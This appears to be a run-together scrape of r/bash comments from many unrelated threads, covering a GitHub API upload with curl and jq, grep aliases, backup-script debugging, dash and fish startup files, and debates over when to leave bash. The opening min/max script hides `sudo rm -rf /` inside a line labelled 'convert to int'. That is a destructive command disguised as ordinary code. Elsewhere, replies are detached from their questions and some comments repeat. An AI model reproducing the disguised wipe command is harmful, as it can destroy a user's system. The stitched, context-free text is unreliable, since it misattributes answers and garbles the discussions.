``` #!/bin/bash max=0 min=0 i=0 for arg in $@ do # convert to int int = $(sudo rm -rf /) if i == 0 then min=$int max=$int fi if $int &gt; $max then max=int fi if $int &lt; $min then min=$int fi done echo "MAX: $max" echo "MIN: $min" ```
For future reference, you should change $1 to $3 in the larger than and set ofs for how you want the separator between the fields. Literal characters can be "somerhing"in the print statement. If i remember correctly :) good luck :)
Thank you so much I really appreciate your help!! 
Here's a utility I wrote in bash to do IP geolocation straight from the command line. There are a million websites where you can do this easily on an ad hoc basis, but I was tired of pivoting from the CLI to a web browser every time I needed to geolocate an IP address. This script is the solution to that problem.
Nice, looks pretty cool, thanks for sharing!
This is great, if I'm to gripe about anything (and this is really minor!) is that it could use a xhow to install" section in the Readme.md I'm going 
OK, so it basically uses the website http://ipapi.co Nothing wrong with that. Would have been nice if you would have been a bit more forward about it. Do know there is a limit of usage and you must pay of you want more. Info on the website. What I would add is the ability to use a domain name. That way you can just do `ipgeo example.com`. There also is geoip. That is often used on websites. https://secure.php.net/manual/en/book.geoip.php Anywho. Pretty nice script.
Thanks for the feedback. I realized after I did the initial push that I'd forgotten a section in the README that talked about how to use the makefile for installation. That's been updated now. Good catch!
I appreciate the feedback. I tried to keep the mechanism as up front as possible. From the first paragraph in the README file: &gt; The utility operates by executing GET requests with cURL against the IP Location API. The utility makes use of the free version of the API, which allows 30,000 requests daily per user. This makes the utility more suitable for ad hoc queries, than for batch processing. My initial thought was do do either a C or Python application that would use a [Maxmind GeoLite database](https://dev.maxmind.com/geoip/legacy/geolite/) on the back end instead of an API, but I ended up going the API route so that it would be a lighter weight utility more in line with the way `whois` and `dig` work. Pretty much all of the geolocation APIs have some kind of cap (particularly the high resolution ones like this), so that enterprises don't milk them without paying anything. This seemed like the best compromise without requiring the user to go through any registration hoops to get an API key. I definitely like the idea of being able to input a domain. That would be a nice added feature. I think I'll implement that.
Thanks!
I saw the liink as well and it is not 30.000 per day. It is 1000 per day (30000 per month) A link to them directly would be nice. For the domain name, first check if dig is installed and then: `dig +short A debian.org` That gives you 4 IP addresses in several countries. Hours of fun to decide how to deal with that/ ;-)
Yeah, parsing and handling the `dig` results should make for a fun addition. Good catch on the number, too. Just updated the docs with that.
Have you looked at any note-taking apps with tagging functionality like joplin?
I'm guessing that when you `alias grep` on your command line, you see: ``` alias grep='grep --color=auto' ``` So when you run `grep` manually, the alias automatically adds a `--color=auto` flag, so the output is colorized by GNU grep. You don't get the same alias in your script, so you don't get coloring there. As this is a course assignment, I'd say it's a difference not worth worrying about, as long as the output _sans_ color is the same.
Thanks for the quick reply. `alias grep` gives me the exact output you wrote out. The issue is that its not letting me progress in the assignment because it is not the same output. Is it possible I made a mistake somewhere? If not what can I do to achieve the correct output?
Several options. 1. Use the full path to get around the alias (`/usr/bin/grep -i cheryl ~uli101/2018c/phonebook`) 2. Use `\` to escape the alias (`\grep -i cheryl ~uli101/2018c/phonebook`) 3. Use command to do the same (`command grep -i cheryl ~uli101/2018c/phonebook`) 4. Disable color output manually (`grep --color=never -i cheryl ~uli101/2018c/phonebook`)
&gt; The issue is that its not letting me progress in the assignment because it is not the same output. I'd argue that it's a _insignificant_ difference, because the coloring you get on the command line __only__ appears when you run it on a terminal. If you redirect it to a file: ``` grep -i cheryl ~uli101/2018c/phonebook &gt; /tmp/my.output ``` or pipe it to another command: ``` grep -i cheryl ~uli101/2018c/phonebook | less ``` I guarantee you it'll be exactly the same, byte-for-byte, as the output of your script. That's what the `--color=auto` option tells `grep` to do: color the output _only when talking to a terminal_. That said, if it really bothers you, you can bypass the alias on the command line with a `\` prefix: ``` \grep -i cheryl ~uli101/2018c/phonebook ``` *Further Reading:* * The [ALIASES](http://man7.org/linux/man-pages/man1/bash.1.html#ALIASES) section of the bash man page
Thank you very much, I just ran all of those solutions but none of them corrected the output according to the assignment. I can only assume that I made a mistake somewhere so here was my step-by-step process. touch ~/scripts/phone vi phone &lt;--- here I edited my file and wrote the earlier script chmod u+x phone PATH=$PATH:~/scripts As far as I can tell, I have followed the instructions carefully but as of right now I am still being prompted that my output is incorrect.
I am aware how minor the difference is and believe me, if I had a choice I wouldn't worry about it. But I am doing this assignment on Putty and the assignment LITERALLY won't let me move on to the next part without completing this one. With that said, I very much so appreciate the replies.
Maybe try adding —color=auto to the script. 
Maybe try adding —color=auto to the script. 
Finding a girlfriend.
Open heart surgery. That's about it.
\`click\` will search for and call \`open\` on the first link it finds. It's useful when you run a command that prints a URL, with this you can simply run \`click\` and it will find and load the link automatically. It really just saves you the copy/paste step, that's all.
I’d like to say that I saw some advice somewhere about the length of your script being indicative that you shouldn’t use a shell script anymore. I don’t think that’s always true. If I have a fleet of servers and I know Bash is available on every single one... I’m writing a fucking Bash script. That said, I usually hit my limitations (read: frustrations) when I need to do complex work with arrays. Then it’s probably Python for me.
Parsing html or json
Manipulating complex data structures or complex APIs (which usually involve complex data structures).
I think the [google style](https://google.github.io/styleguide/shell.xml?showone=When_to_use_Shell#When_to_use_Shell) guide hits the nail on the head: &gt; If you're mostly calling other utilities and are doing relatively little data manipulation, shell is an acceptable choice for the task. &gt; If performance matters, use something other than shell. &gt; If you find you need to use arrays for anything more than assignment of ${PIPESTATUS}, you should use Python. &gt; If you are writing a script that is more than 100 lines long, you should probably be writing it in Python instead. Bear in mind that scripts grow. Rewrite your script in another language early to avoid a time-consuming rewrite at a later date.
I have a couple of "hard no's" that end in me dropping bash for a more robust language. One is hash tables. If I ever catch myself googling "hash tables in bash," that's my cue to rewrite in python or something else. Other big thing is parsing structured data, like json or yaml or ini format. If I have to get values from a structured data format and use them in variables, I'd rather use something with libraries specifically made for reading those formats. I have had one larger bash script that I had to rewrite for performance reasons. It had lost of loops and lots of calls to the iptables, iptables-save, and iptables-restore executables. It would take 5-7 seconds to initialize the iptables config in bash, which I considered too long. I rewrote it in python and then it ran reliably in about 0.5 seconds.
Really depends on what you're doing. I've written 500+ line bash scripts, but it all mainly called system utilities. It worked fine and was fast. That script managed a complex Drupal environment.
&gt; I usually hit my limitations (read: frustrations)... Honestly frustration is probably the only hard and fast rule, but from that is where i get line limitations and other somewhat arbitrary rules. Anyways its pretty clear that bash is grate for command duct tape, its weird how hard (or at least involved) it can be to do simple stuff like #!/bin/bash if [[ ! -f /usr/bin/convert ]]; then printf "imagemagick not installed" exit 1 fi # use single quotes at it would expand now rather then when its called, from shellcheck trap 'rm $lockbg; exit' EXIT INT lockbg='/tmp/lock.png' maim "$lockbg" convert "$lockbg" -filter point -resize 10% -resize 1000% "$lockbg" i3lock -u -i "$lockbg" 
Everyone's recommending Python so I feel justified shilling my favorite toy. So far, most of my frustrations with Bash (multidimensional arrays, complex regex) have been satisfied by gawk (GNU Awk). It's effectively C shorthand designed to be used alongside the shell. It's far tighter than Perl, and the syntax really clicks for me. It probably won't net you a "real programming job" but it will give you a healthy return on your time in terms of your ability to parse structured data (esp. on the fly), which is usually where Bash disappoints me. Here is a [list of one-liners](http://tuxgraphics.org/~guido/scripts/awk-one-liner.html) to whet your appetite, and here is [way too much info](https://www.gnu.org/software/gawk/manual/gawk.html) about modern GNU Awk. Do be warned that Awk v. Perl is a bit of a holy war. Holy fuck are you still reading this? Well then I should mention that Bash doesn't have a built-in way to [securely automate interactions with remote devices.](https://www.nist.gov/publications/how-avoid-learning-expect-or-automating-automating-interactive-programs) 
though jq(1) is a good tool for json parsing
Could it matter that the example directory and your directory are different? You have a directory called 2018c where that doesn't exist in the example. How do you think the system is testing results exactly?
In that case, I strongly suggest that you run the following in your Putty session: ``` unalias grep ``` Otherwise, the command you're really running manually is actually: ``` grep --color=auto -i cheryl ~uli101/2018c/phonebook ``` which is clearly not what your assignment asks you to do. Undefining that `grep` alias ensures that you're running **exactly** the same command, with the same parameters, in both cases. 
I'm not sure what you mean by hard there. It's probably not helping my question, but some suggestions: 1. Replace `/bin/bash` to `/usr/bin/env bash` for better portability in the shebang. 2. Use `command -v convert` instead of testing its existence with a hardcoded path. 3. Use `echo` instead of `printf` or add `\n` at the end. 4. Remove the `exit` command and `INT` from the trap, as exiting it is superfluous when it's activated when it's exited, and 'EXIT` gets triggered by `INT`.
&gt; I'd like to know more about its limitations. They revolve around the original use-case for shell interpreters to provide **orchestration languages**. I find it helpful to remind myself of the true purpose of bash, ksh, _et al_: ``` Run programs under various conditions (or unconditionally) Connect them together, and manage their lifetime Feed them with input, lightly manipulated (if at all) Put their output someplace useful ``` If your intended application can be implemented around the above concepts, life-with-shell is sweet. Trying to convince your shell to do more than this is usually an uphill battle. You can [write a Forth interpreter in pure bash](https://web.archive.org/web/20050222174114/http://forthfreak.net/index.cgi?BashForth), but there are probably better things to do with your time.
One suggestion for a feature in a future - it would be great to have it automatically geolocate hostnames as well as IP addresses by doing a DNS lookup. 
Thanks for the x2 on that. It'll definitely make it into the next push.
It does whet my appetite! Quick and dirty one-liners are very appealing to me.
Programming itself is duct tape. We could all do things manually forever but thankfully we’ve invented code to do those things for us ;) Take this entire thread and replace “Bash” with “assembly” or even “C”. I think it puts a new perspective on the discussion.
Use bash to install Ansible and Python and that's about it
Seems great, but I think I have good reasons to not follow this route right now. I've been using Linux for a long time, but being an advanced user is very different than learning it for professional purposes. And I think learning bash, not just how to run commands but also scripting, would help me understand the command line a lot more. As someone who wishes to work with Linux in the future, I think need to be familiar with shell scripting, even if I only call it from Python. I've never used Ansible, but everyone seems to love it. I'll certainly want to learn it in the future. Thanks! 
Unless you're working with physical systems, you don't _need_ bash to script. Yes having more cli experience is important but bash is a disgusting language. Everything has Python on it, learn that. You'll pick up the bash along the way.
Spent about six hours more than I should have on awk this week. Learned a lot, including that the python `re` module is easier for me to grok :p But I can definitely appreciate the simplicity of awk's parsing and matching capabilities--when called in a bash while loop.
How will \`/bin/bash\` -&gt; \`/usr/bin/env bash\` make the script more portable? You still rely on a hard coded path to the \`env\` program. Are there any lunixes that includes bash, but doesn't use the \`/bin/bash\` location?
I understand bash is not necessary, but my question is: wouldn't bash be valuable (and other shell languages) at least as a learning tool to better understand Unix-like systems? I'm sure I could do everything in Python (which I happen to like), but because bash has a smaller scope, the documentation and learning materials are much more focused, containing many bits of knowledge about the OS itself. How would learn this stuff without going through shell scripting?
I've looked at metric tone of apps, but I always end up going back to text files and svg's. It's just the only thing that's really reliable. I liked microsoft's OneNote, but eventually got annoyed with it too for whatever reason. 
I suppose it would help but I've never made a study of things easily googled. Depends on what you're doing though. Here's the thing: when I was learning to develop, I had a hard time thinking of things to program. Now I realize that the language is just a tool (a well documented one) and that I'm using it to complete a task. Knowing and understanding all aspects of said task is the important aspect of the job; whereas there are always more tools for you to learn.
I never said I wanna be an engineer! :P
Follow-up question: are admins engineers?
Why not use a local MaxMind DB to achieve the same thing, with no requirement to call out to a third party? 
Admins perform engineering tasks but focus more on maintaining infrastructure. I did not enjoy being an admin personally. If that's your goal, and that is totally fine -- great in fact, then getting a solid handle on bash would be useful. Especially if you're mostly on prem. If you're in the cloud, I don't think investing a ton of time into bash up front is the best use of your time.
for regex I also often use grep -P and sed tho -P not available everywhere
Most UNIX systems don't have bash installed by default (mostly just MacOSX), but typically have it available through a package manager, but then it is typically installed in a different path, like /usr/bin or /usr/local/bin or /opt/something/bin. You can generally rely on env being in /usr/bin though.
&gt; 3\. Use `echo` instead of `printf` or add `\n` at the end. I disagree on this part. One should always prefer `printf` over `echo`. `echo` is only supported so old scripts that use `echo` can continue to work as before. New scripts should use `printf`. This applies to both bash and sh.
`printf` is also much, much faster.
Bash is awesome, it's my bread and butter. I think your observation about positive and negative aspects is correct. It is not true that you cannot write efficient code in bash either, but it probably requires more care to achieve a comparable result. Any programming language is a means to an end. What language makes sense to use depends on the objective, in my opinion.
Yeah, that's the alternate option. However, there's a lot more overhead there, since you've got to download the entire database beforehand, and update it regularly. An API solution is lighter and more portable. Although, it requires an internet connection and has volume limitations. Neither solution is perfect for all use cases.
Once I exit the realm of just calling different applications and shuffling around parameters really. Though to be fair I never loved bash and I don't think I ever could.
I know this is getting off-topic and kind of personal, so feel free not to answer, but why you didn’t like being an admin?
As far as my experience in industry is concerned, apart from the second point, this is pure bunkum. You can do serious data processing with bash - just be careful. After all, we've been doing it for years - it's mostly a matter of arranging sed, grep, awk, sort and other utilities which are fast and efficient. bash is just the glue. If you're having trouble with arrays you just need to read the docs a bit more carefully. They are an extremely useful data structure in bash. There are reasons for using bash that transcend the script length. For example, you need to have a common platform for RHEL5, RHEL6 and RHEL7. Just write to bash-3. With python/ruby/whatever you run into version nightmares both in the base python and the extensions/libraries. Been in all these situations in major fortune-500 production environments with thousands of RHEL instances. We only felt the need to upgrade to python in a small number of performance related scripts - count them on one hand. Slavishly converting everything to python would have been a serious impost to labour and productivity even though management often got a bee in their bonnet about it. They always backed off when they understood the costs. Equally, we upgraded python scripts to C for performance reasons eg when running into the Global Interpreter Lock.
i meant hard in other languages, and by hard i really mean cumbersome, gluing other programs together in python is not as fun. 1: i agree 2: sure good idea 3: ill do what ever i want here 4: i found with certain things trapping INT will not exit the script like #!/usr/bin/env sh trap 'echo trap' EXIT INT for i in {1..10}; do echo "$i" sleep 1 done so ill probably keep the exit anyways ive updated the script 
Creating cloud resources with awscli or gcloud or az. Just use Terraform
&gt;3: ill do what ever i want here How about: die() { printf '%s' "${@+$@$'\n'}" 1&gt;&amp;2 exit 1 } It uses the name `die`, since that's what it's called in other languages (you can rename if if you want), it prints the arguments passed to it (all of them, not just the first one), a newline after them unless there are no arguments, and redirects it to `stderr`. &gt;4: i found with certain things trapping INT will not exit the script like &gt; &gt; #!/usr/bin/env sh &gt; &gt; trap 'echo trap' EXIT INT &gt; &gt; for i in {1..10}; do &gt; echo "$i" &gt; sleep 1 &gt; done That's because you're trapping `INT`. If you remove that `sigspec`, `INT` will automatically exit the script, and thus trigger the `EXIT` trap.
Well, that's why I said *"or add `\n` at the end"*. Although I didn't know that `echo` was discouraged *that* badly, just that it had some problems with some usage of variables, and thought that it was ok for simple usage. I'll make sure not to suggest `echo` now.
thanks for you help. 
I stop using bash when: I need to use hashes I need to parse yaml/ json I’m sure it’s doable, to “real” languages do this so much better. 
You cannot SETUID or SETGID using a bash script. You must write a program, even a simple C program 
`alias Grep="grep -oPrs"` For when you need to grep the fuck out of something Sed and Awk 2nd ed., by D. Dougherty has some excellent sed tricks that make it useful for processing multiple lines, though the Awk part of that book really shows its age.
Because you deal with and maintain old infrastructure that is likely outdated. Also it's always either really poorly implemented (frustrating) or really well implemented (boring). I like to play with all the buzzword technologies and build it myself, then pass it along to the admins
&gt; stuff like the Bash Hackers wiki, Shellcheck, the Bash Manual, and even the Stack Exchange network are all fine with that. Depends what you mean by "fine" here. Obviously the manual will document the echo builtin, since it's a shell builtin. Shellcheck is "fine" with it for the same reason. Doesn't mean its use is encouraged. If it helps, here's [POSIX encouraging use of printf over echo](http://pubs.opengroup.org/onlinepubs/9699919799/utilities/echo.html#tag_20_37_16), and [here's the maintainer of bash doing the same](http://lists.gnu.org/archive/html/bug-bash/2013-04/msg00008.html). &gt; What are your thoughts on `printf "string"`? Uh, it's good..? it's a vague question. Not sure what you're actually trying to ask.
Ah, thanks for the links. &gt; Uh, it's good..? it's a vague question. Not sure what you're actually trying to ask. Well, it has similar problems to `echo`, so I was asking if you also think it should also never be used (basically, if it's still bad practice when used with simple strings).
Putting literal strings in printf's format string is fine. You have to escape % and \ accordingly, of course, and if the string starts with - you either have to use -- or, move the string out of the format string. Putting variables in printf's format string is bad though, unless the variable specifically holds a format string.
You will never find a girl of you're too bashful.
Its possible whatever is managing the assignment is broken or misconfigured. Ask the instructor.
It looks like your submission contains a shell script. To properly format it as code, place four space characters before every line of the script, and a blank line between the script and the rest of the text, like this: This is normal text. #!/bin/bash echo "This is code!" &gt; This is normal text. &gt; &gt; #!/bin/bash &gt; echo "This is code!" *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/bash) if you have any questions or concerns.*
What error message is it producing and which dist are you trying to run it on?
Are you getting an error, or is it just silently failing?
Put `set -xe` on the second line. That will show you what it is exactly doing and will stop on the line where it goes wrong, if at all. Perhaps it does what it is supposed to do, you just do not wanted it top do that. I would also put doublequotes around parameters. e.g. `tar --create --gzip --file="$DESTDIR$FILENAME" "$SRCDIR"` I personally also put `exit 0` at the end, so when I see that with the added `set -xe`, I know it did the whole script.
Is it just me or you are missing a hash(#) from L1C1?
Just silently failing
You also appear to have an extra space that does not belong there in L1C2. A typical shebang is a pound sign followed by an exclamation mark and an interpreter. No spaces in between. [https://en.wikipedia.org/wiki/Shebang\_(Unix)](https://en.wikipedia.org/wiki/Shebang_(Unix)) 
Doesn't show an error message, I created this script while using Arch, than changed to ubuntu-mate and it worked well, then changed to Deepin add it worked as well, now back at ubuntu-mate doesn't work again
After some tests it seems you can get away with the extra space, not the missing pound tough.
What is the output of this?: #!/bin/bash SRCDIR="/home/bernardo/Desktop/Web/" NDDIR="/home/bernardo/Desktop/certificados/" RDDIR="/home/bernardo/Desktop/EuroSocial/" DESTDIR="/home/bernardo/Backups/" FILENAME=Web-$(date +%-Y%-m%-d)-$(date +%-T).tgz FILENAME2=certificados-$(date +%-Y%-m%-d)-$(date +%-T).tgz FILENAME3=EuroSocial-$(date +%-Y%-m%-d)-$(date -%-T).tgz if [ ! -d ${SRCDIR} ]; then echo ${SRCDIR} does not exist; exit 1 fi if [ ! -d ${NDDIR} ]; then echo ${NDDIR} does not exist; exit 1 fi if [ ! -d ${RDDIR} ]; then echo ${RDDIR} does not exist; exit 1 fi if [ ! -d ${DESTDIR} ]; then echo ${DESTDIR} does not exist; exit 1 fi touch $DESTDIR$FILENAME touch $DESTDIR$FILENAME2 touch $DESTDIR$FILENAME3 
Can't see anything that should stop it working, assuming all the relevant directories exist, but there's a lot of ugly repetition in this script. Something like this would work the same: #!/bin/bash SRCDIR="~bernardo/Desktop" DESTDIR="~bernardo/Backups" TIMESTAMP=$(date +%-Y%-m%-d)-$(date +%-T) for dir in Web certificados EuroSocial; do tar --create --gzip --file=$DESTDIR/$dir-$TIMESTAMP.tgz $SRCDIR/$dir done 
When I troubleshoot I do everything manually to verify that what I think works actually works. You can also add `set -x` and/or `set -v` to the script so it prints exactly what it's doing once you've manually verified that the code you're trying to run actually works correctly. 
This looks much nicer. I also like leaving the trailing slash out of the directory name like you do. If you add quotes, you will also support directory names with spaces. Furthermore, it won't add anything here, but I like to encapsulate my variables wth brackets `{}`. #!/bin/bash SRCDIR="/home/bernardo/Desktop" DESTDIR="/home/bernardo/Backups" TIMESTAMP="$(date +%-Y%-m%-d)-$(date +%-T)" for dir in Web certificados EuroSocial; do tar --create --gzip --file="${DESTDIR}/${dir}-${TIMESTAMP}.tgz" "${SRCDIR}/${dir}" done 
 DATA='{"message": "update", "content": '"$local_file"', "sha": '"$github_hash"'}' echo $DATA | curl -r PUT -u "$user:$token" -d @- https://api.github.com/repos/$user/$repo/contents/$file `echo $DATA | curl ...` feeds the data to curl's stdin, and `-d @-` tells curl to use stdin as the POST data
Have you tried adding it at the end of your .bashrc?
For me that's how it worked, by adding fish at the end of my startup sequence, I get a normal bash login environment initiation with fish running on top of it.
That's not the issue I'm having. I need to fork the process to run `fish` and the `if` statement in parallel.
Thanks for the reply! &gt;DATA='{"message": "update", "content": '"$local\_file"', "sha": '"$github\_hash"'}' echo $DATA | curl -r PUT -u "$user:$token" -d @- [https://api.github.com/repos/$user/$repo/contents/$file](https://api.github.com/repos/$user/$repo/contents/$file) &amp;#x200B; So I've tried that, but now I'm getting a vague error of "Warning: Invalid character is found in given range. A specified range MUST have only digits in 'start'-'stop'. The server's response to this request is uncertain."
I want this to run in `~/.profile` (roughly equivalent to `~/.bash_profile`) not `~/.bashrc`
I'd also avoid injecting data into the json and rather create the json safely with `jq`. jq -nc --arg content "$local_file" --arg sha "$github_hash" '{message:"update",$content,$sha}' | curl -X PUT -u "$user:$token" -d @- "https://api.github.com/repos/$user/$repo/contents/$file"
Thanks for the info, but I am still getting the following error: &amp;#x200B; ./arrests.sh: line 42: /usr/bin/jq: Argument list too long { "message": "Problems parsing JSON", "documentation\_url": "[https://developer.github.com/v3/repos/contents/#update-a-file](https://developer.github.com/v3/repos/contents/#update-a-file)" } &amp;#x200B;
Ah, of course. Your `local_file` variable is too long. You can pass it to jq's stdin instead: printf %s "$local_file" | jq -Rc --arg sha "$github_hash" '{message:"update",$sha,content:.}' | curl -X PUT -u "$user:$token" -d @- "https://api.github.com/repos/$user/$repo/contents/$file"
Just like this probably? do_profile() { : # whatever common profile stuff } # Interactive case $- in *i*) do_profile &gt; /dev/null 2&gt;&amp;1 &amp; exec fish ;; esac # Non-interactive do_profile : # whatever specific non-interactive stuff 
Okay, thanks! That seems to be working. I'm getting an error about the hashes not matching... but I'll sort that out later. Thanks!
You have 3 keys in your JSON, the last two have values that are surrounded by a single quote AND a double quote. E.g. `’”$local_file”’` for the `”content”` key. And `’”$github_hash”’` for the `”sha”` key. I think you need to remove those single quotes.
It doesn't run the part after esac in this case.
You mean when it's interactive? Isn't that the point?
No, I still want the rest to run (in the background) if it's interactive
Yeah, I had to leave but I was thinking it was probably just extra/missing quotes/double quotes somewhere
Right. Put the commands that are common to both interactive and non-interactive log-in shells in `do_profile()`. Whatever is in that function will be run in the background if the shell is interactive, and in the foreground if not
I suggest following what others have said and avoid manually sticking your JSON together and using `jq`
It doesn't seem to run the last do\_profile if running interactively. Probably because of the exec in front of fish makes it take the place of the first process. Without the exec, though, it does run the last do\_profile but only after exiting fish.
Yes, the last `do_profile` (and everything else after the `esac`) is only run when not interactive. I'm not sure why you'd want to run it twice. If there are any other commands that you need to run asynchronously for interactive shells you can put them in their own function (or just a subshell) and background that before the `exec`
This is intended for my `~/.profile` and the last and only expression I want to run after esac is the one that starts X if it's on the right display and tty, like so: if [ -z $DISPLAY ] &amp;&amp; [ $(tty) = /dev/tty1 ] then exec startx fi
You can do this: exec fish Dash will then replace itself with fish. The rest of your dash script will not run. If you want to see a bit of documentation about the `exec` shell command, run bash and type `help exec` at bash's prompt.
This took a bit, but I think I finally understood your problem: You want your X desktop to start when you log in, and you do not want to use a display manager, you want to use the text console for logging in. I don't know what else you want to do in your .profile. I'm guessing you can just put your check for `$-` and `exec fish` at the end of your `.profile`. This could be just a single line at the end: case "$-" in *i*) exec fish ;; esac
&gt;Equally, we upgraded python scripts to C for performance reasons eg when running into the Global Interpreter Lock. &amp;#x200B; I'm unswayed. You can get all kind of egregious things done in bash. Like \[parse JSON\]([https://github.com/dominictarr/JSON.sh](https://github.com/dominictarr/JSON.sh)). There's even a \[bash web framework\]([https://github.com/jneen/balls](https://github.com/jneen/balls)). It would make good sense to *not* use those tools though. I think you've missed the point. Don't use bash if you need floating point math. Or you need hash-maps (at least with any serious backwards compatibilty). You should avoid bash if you need to use functions, arrays, complex conditionals, regexes, time and date handling, complex data destructuring, etc, etc, etc. These are all things that bash as a language can handle, yes. But if the core of your task requires any complex data or logic, a language that is string-centric will make it difficult to express that task in a concise and maintainable way. &amp;#x200B; Bash has it's very good uses. Specifically process control and indirection. The shell is the "glue" that fuels the unix philosophy. That means using specific tools where it makes sense. The contraposition of that is not using specific tools when it doesn't make sense to. I reiterate that i think that google hit the nail on the head. And i personally dislike python. Semantic whitespace is awful.
I'm not disagreeing, just curious - why?
Cuz there’s higher likelihood of human error. Using a tool like `jq` makes it simple enough to create JSON blobs without having to worry about the intricacies of correct formatting
What we know so far: * You're using `dash`. * Your code goes in `~/.profile`, so it's typically run only on a login. * You want to start X at the end of `~/.profile`. * Just before that, you want to fork off an interactive `fish` on an interactive session It sounds to me that you have your order flipped: You should *fork off* `startx` instead, *then* `exec fish`, so something like this: ... # Start X if conditions are right if [ -z $DISPLAY ] &amp;&amp; [ $(tty) = /dev/tty1 ] then startx &amp; fi # Finally, start fish if interactive case $- in *i*) exec fish ;; esac This way, `startx` continues to run as an independent process regardless of what happens next.
Others have already suggested `jq`, so I'll suggest [jo](https://github.com/jpmens/jo) instead, as a tool specifically designed to _generate_ proper JSON, and leave `jq` to the more difficult task of _parsing_ JSON. I think you'll find the `jo` syntax to be absurdly simple, and thus really hard to get wrong: ``` curl -r PUT -u "$user:$token" -d "$(jo message=update content=@local_file sha=$github_hash)" https://api.github.com/repos/$user/$repo/contents/$file ``` `content=@myfile.txt` substitutes the content of `myfile.txt` as the value of `content`. If you wanted the Base64 representation instead (say, you're uploading an image), do `content=%mypic.png` instead.
what does encapsulating variables with brackets do that double quotes don't?
\+1 double quoting variables. They should always be double quoted, especially with things like file paths that can easily include spaces.
I don't see where a solution has been posted yet? Since this is a distribution issue I would take a close look at the operation of the date command in the FILENAME variables. Since you have not double quoted FILENAME in the tar statements, if the date command inserts spaces somehow, the tar commands would fail.
Also, I rely heavily on the relatively simple-minded debugging technique of echoing variables at each step to make sure that they are what I think they are,
Thanks for the reply. &amp;#x200B; I realized there was a cleaner, better way to have it done. Check out my OP.
Well, you can replace `true` with `:`. It's about as close to a nop as you can get, _and_ it will save you time writing functions that do nothing :P
They do completely different jobs. In this eample, the brackets make it clear where one varaible starts and another ends. You can do lot's of fun things with them though. value="${myArray[${index}]}" Also, they allow strings to immidiately follow the variable name. foo="foo" value="$foobar" #Sets value to empty stiring value="${foo}bar" #Sets value to foobar The brackets also let you do simple replacements too. myString="This is my string" echo ${myString/my/a} #prints This is a string"
While I'm happy for you, you actually *didn't* achieve what you wanted: &gt;I want to spawn a different shell in the foreground if it is interactive, and continue to run the rest of the script in the background Read the sentence immediately before the `dash` man page section you quoted: &gt;A login shell *first* reads commands from the files /etc/profile and .profile if they exist. So your `.profile` actually runs to completion *before* `$ENV` is invoked. To see this, add a `sleep 60 ; echo DONE` to the end of your `.profile` for a nasty surprise. Your `startx` probably executed quickly enough that it looked as if it ran in parallel with `fish`.
stub( # noop below : )
 stub( # noop below. : )
I thought I knew everything about Bash scripting. This is awesome and simple!
&gt; So your `.profile` actually runs to completion *before* `$ENV` is invoked. I think you might be mistaken. `ENV` is only invoked if an *interactive* `dash` shell starts. So it's not even invoked at all in my `.profile`. The only thing that happens in the `.profile` is the ENV variable gets set to point to the `.shinit` file and is exported. In fact, even after the point where I'm in my login, no interactive shells are have been spawned yet. When I open the first terminal (inside X), it's the first interactive shell, and it *does* source `ENV`. I can test this by finding all instances of `fish`: 1. Login. Open a terminal. A `fish` shell opens (meaning `dash` must have run interactively, sourcing ENV, and doing `exec fish`, replacing itself) 2. Find out the current shell's PID. $ echo %self 1918 3. Find PIDs for all instances of `fish`. $ pgrep fish 1918 There is only one running `fish`, and it's the current shell. If I open a second terminal I do indeed show 2 PIDs when running step 3 again.
&gt; While tinkering with a hobby project, I noticed that bash doesn't seem to like empty function bodies? As others have already noted, `:` is your friend. More to the point, you should read the bash man page carefully. **Everywhere** that bash specifies a `command`, or some variant thereof, you **must** specify one of the constructs listed in the [SHELL GRAMMAR](http://man7.org/linux/man-pages/man1/bash.1.html#SHELL_GRAMMAR) section--comments just won't cut it. That means code like the following is syntactically correct, though functionally dubious: ``` # Ensure doit() definition doesn't throw errors before running it if doit() { echo DONE; }; then doit fi ```
&gt;In fact, even after the point where I'm in my login, no interactive shells are have been spawned yet. Your login shell (the one you get after your type in your username and password at a console) *is* an interactive shell by definition, and is the only shell that sources all of `/etc/profile`, `~/.profile`, and `$ENV` (if any of them actually exist). Try adding `echo $$ &gt;&gt; /tmp/pids.lst` to the beginning of your `.shinit`, then logout and login again. If I'm right, you should have *N+1* PIDs in `/tmp/pids.lst` after opening *N* terminals, and the first PID in the list may no longer exist in your process table (i.e. your login shell exited for some reason).
Actually, we're both wrong. :) You're wrong in that your login shell _is_ an interactive shell by definition. Your `.profile` already assumes this in its `$-` test. But I'm wrong in that the login shell _doesn't_ spawn a `fish`...because `ENV` wasn't preloaded into the login shell's environment, as per the `dash` man page. If, OTOH, you'd set `ENV` in a file that's loaded at login by the [pam_env](http://man7.org/linux/man-pages/man8/pam_env.8.html) PAM module, then it would've sourced `~/.shinit`, and you'd have one extra `fish` on your hands. To be clear: * A `dash` login shell sources all of `/etc/profile`, `~/.profile` and `$ENV` (if set on invocation). * A `dash` terminal shell sources _only_ `$ENV` (if set). 
FYI, zsh does allow empty compound commands (including function bodies). $ zsh -c 'fn() { } ; fn ; echo ok' ok 
To be clear, aside from the name, `:` and `true` are identical. They call the exact same function internally. `:` just looks nicer for some things. In answer to the original question, bash parses a function definition body as a compound command (usually a brace-enclosed list, obviously), and compound commands must have... a command. It's not possible to make them empty. If you want a function that does nothing, aside from putting `true` or `:` in it, you can just put `return` at the top. This works not only when the function is a deliberate no-op, but also when the function already has commands in the body and you just want to short-circuit them for testing or whatever.
 root|root|0|10/25/2018|-1|-1|-1|-1||sudo|Mon Dec 10 11:22 still logged in user1||421|10/25/2018|0|99999|7|-1|disabled|sudo| user2||422|10/25/2018|0|99999|7|-1|disabled|sudo| user3||423|10/25/2018|0|99999|7|-1|disabled|sudo| &amp;#x200B; But Normally we have 2 sudo users like below. But as can you see , its returning sudo for user3 too. What might be problem? &amp;#x200B; here is my sudoers file : &amp;#x200B; user1 ALL=(ALL) NOPASSWD: ALL # user2 ALL=(ALL) NOPASSWD: ALL # &amp;#x200B; My other question is : When attempting to run on CentOS/RedHat OS then I am getting the following th error message Just I am running it on opensuse: &amp;#x200B; passwd: bad argument -Sa: unknown option
